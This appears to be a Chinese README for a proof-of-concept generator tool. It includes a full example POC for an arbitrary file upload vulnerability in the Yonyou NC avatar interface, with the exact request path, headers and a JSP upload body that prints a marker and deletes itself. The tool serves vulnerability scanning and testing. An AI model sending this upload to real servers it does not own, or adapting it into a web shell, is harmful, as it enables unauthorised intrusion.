# Hunting-Rabbit-POC-Generator

## 简介

本项目为 Hunting-Rabbit 系列项目之一 ，是Hunting-Rabbit-VulScanner 专属POC生成器，致力于最直观简洁的POC编写。

## 截图/演示

![image-20240620110948651](img/image-20240620110948651.png)

生成的POC如下：

![image-20240620111438677](img/image-20240620111438677.png)

```json
{
    "vul_name": "用友 NC avatar 任意文件上传",
    "level": "高危",
    "description": "用友 NC acatar接口存在任意文件上传漏洞，可上传恶意脚本至服务器。",
    "product": "用友 NC",
    "version": "用友 NC",
    "cve": "无",
    "reference": "https://mp.weixin.qq.com/s/SS_KVTcomHmWbP5zEvVyMw",
    "fixing": "https://blog.csdn.net/qq_36618918/article/details/137913219\n1、升级到安全版本\n 2、如非必要，禁止公网访问该系统。\n 3、设置白名单访问。",
    "rule": {
        "path": "/uapim/upload/avatar?usercode=qbll&fileType=jsp",
        "method": "GET",
        "headers": "User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36\nConnection: close\nContent-Length: 242\nAccept-Encoding: gzip, deflate, br\nContent-Type: multipart/form-data; boundary=----v6bavojmqudas7g0al2o",
        "body": "------v6bavojmqudas7g0al2o\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"klywwjrrux.jsp\"\n\n<%out.print(\"lmnpl\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\n------v6bavojmqudas7g0al2o--",
        "status_code": "200",
        "keywords": "true",
        "res_time": ""
    },
    "operator": {
        "author": "浪飒",
        "email": "langsa-hy@qq.com",
        "github": "https://github.com/langsasec"
    }
}
```



## 安装和使用

1. 拉取代码：

   ```
   git clone https://github.com/langsasec/Hunting-Rabbit-POC-Generator
   ```

2. 安装依赖

   ```
   cd Hunting-Rabbit-POC-Generator && pip install -r requirements.txt
   ```

3. Python3运行

   ```
   python Hunting-Rabbit-POC-Generator.py
   ```

4. 运行后会生成config.ini配置文件，内容如下，可自行配置

   ```
   # 请勿删除此行，这是为了用户填写联系信息，你将是POC的贡献者，方便其他用户使用POC时可以互相联系，也可以不填写
   Author= 你的名字
   Email=邮箱
   GitHub=Github地址
   ```
